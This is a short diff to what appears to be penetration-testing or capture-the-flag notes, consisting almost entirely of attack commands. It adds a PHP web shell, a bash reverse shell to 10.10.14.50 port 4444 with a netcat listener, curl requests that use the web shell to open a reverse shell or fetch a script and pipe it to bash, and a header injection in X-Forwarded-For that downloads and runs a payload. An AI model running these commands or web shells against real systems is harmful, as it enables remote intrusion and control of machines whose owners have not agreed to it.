@@ -30,12 +30,20 @@ Python virtual environments mess with `$PATH`. Always use full paths:
 
 ```
 # Terminal:
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
 echo 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1' > shell.sh
 python3 -m http.server 8000
 
 nc -lvnp 4444
 
 # Web request:
+curl 'http://RHOST/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
+
+# or
+curl 'http://RHOST/shell.php?cmd=curl+http://YOUR_IP:8080/shell.sh|bash
+
+# or case:
 curl 'http://RHOST/firewall.php' \
   -H 'Cookie: PHPSESSID=7sjgc79l18h0vhcb64cq7m5oe3' \
   -H $'X-Forwarded-For: 127.0.0.1;curl http://YOUR-IP:8000/shell.sh -o /tmp/s && bash /tmp/s'
